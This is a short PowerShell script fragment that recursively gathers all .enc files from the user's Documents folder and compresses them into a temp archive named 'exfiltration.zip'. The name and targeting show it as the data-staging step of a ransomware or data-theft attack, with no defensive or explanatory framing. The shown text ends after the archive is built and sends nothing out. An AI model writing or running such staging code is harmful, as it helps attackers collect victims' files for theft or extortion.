# Set the target folder
$folder = "$env:USERPROFILE\Documents"
$files = Get-ChildItem -Path $folder -Include *.enc -Recurse -ErrorAction SilentlyContinue

# Archive encrypted files
$archivePath = "$env:TEMP\exfiltration.zip"
if ($files) {
    Compress-Archive -Path $files.FullName -DestinationPath $archivePath -Force
}
